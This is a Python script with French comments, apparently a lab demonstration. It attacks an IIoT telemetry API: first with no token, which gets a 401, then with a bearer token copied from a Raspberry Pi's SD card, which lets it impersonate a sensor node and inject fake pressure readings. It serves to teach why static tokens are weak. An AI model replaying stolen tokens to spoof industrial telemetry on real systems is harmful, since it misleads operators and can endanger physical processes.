#!/usr/bin/env python3
"""Attaquant contre l'API en mode token, en deux temps :

  1. sans token : l'attaquant ne connaît rien, le serveur répond 401 ;
  2. avec le token volé (copié depuis la carte SD du Pi) : le serveur accepte de fausses mesures.

Entrée entre les deux phases (--no-pause pour enchaîner). --phase permet de n'en rejouer qu'une.
"""
import argparse
import ssl
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "client"))
from common import describe_error, post_json  # noqa: E402

p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
p.add_argument("--server", default="https://api.iiot.lab:8000")
p.add_argument("--ca", required=True, help="certificat public de la CA (aucun secret)")
p.add_argument("--token", help="token volé (sinon --token-file)")
p.add_argument("--token-file")
p.add_argument("--device-id", default="edge-01", help="nœud à usurper")
p.add_argument("--value", type=float, default=11.5, help="fausse pression injectée (bar)")
p.add_argument("--count", type=int, default=5, help="paquets avec le token volé")
p.add_argument("--count-no-token", type=int, default=4, help="paquets sans token")
p.add_argument("--phase", choices=["tout", "sans-token", "avec-token"], default="tout")
p.add_argument("--no-pause", action="store_true", help="ne pas attendre Entrée entre les deux phases")
a = p.parse_args()

BOLD, RED, GREEN, DIM, END = "\033[1m", "\033[91m", "\033[92m", "\033[2m", "\033[0m"
if not sys.stdout.isatty():
    BOLD = RED = GREEN = DIM = END = ""

ctx = ssl.create_default_context(cafile=a.ca)
payload = {"device_id": a.device_id, "metric": "pressure_bar", "value": a.value}


def inject(headers: dict[str, str], count: int) -> None:
    for _ in range(count):
        try:
            status, body = post_json(a.server, "/telemetry", payload, ctx, headers)
            colour = GREEN if status < 400 else RED
            print(f"  injection pression={a.value} bar au nom de {a.device_id} -> {colour}HTTP {status}{END} {body}")
        except (ssl.SSLError, OSError) as exc:
            print(f"  {RED}ÉCHEC{END} : {describe_error(exc)}")
        time.sleep(0.7)


if a.phase in ("tout", "sans-token"):
    print(f"{BOLD}[attaquant] Phase 1 : sans token{END} {DIM}(l'attaquant n'a rien volé){END}")
    inject({}, a.count_no_token)
    print(f"{DIM}  -> le serveur exige un token : rien ne passe.{END}")

if a.phase == "tout" and not a.no_pause and sys.stdin.isatty():
    input(f"\n{BOLD}[attaquant]{END} Le token vient d'être copié depuis la carte SD du Pi (cat /etc/iiot/token). Entrée pour le rejouer… ")

if a.phase in ("tout", "avec-token"):
    token = a.token or (Path(a.token_file).read_text().strip() if a.token_file else "")
    if not token:
        sys.exit("[attaquant] token manquant : --token ou --token-file")
    print(f"{BOLD}[attaquant] Phase 2 : avec le token volé{END}")
    inject({"Authorization": f"Bearer {token}"}, a.count)
    print(f"{DIM}  -> accepté : pour le serveur, c'est le vrai nœud.{END}")
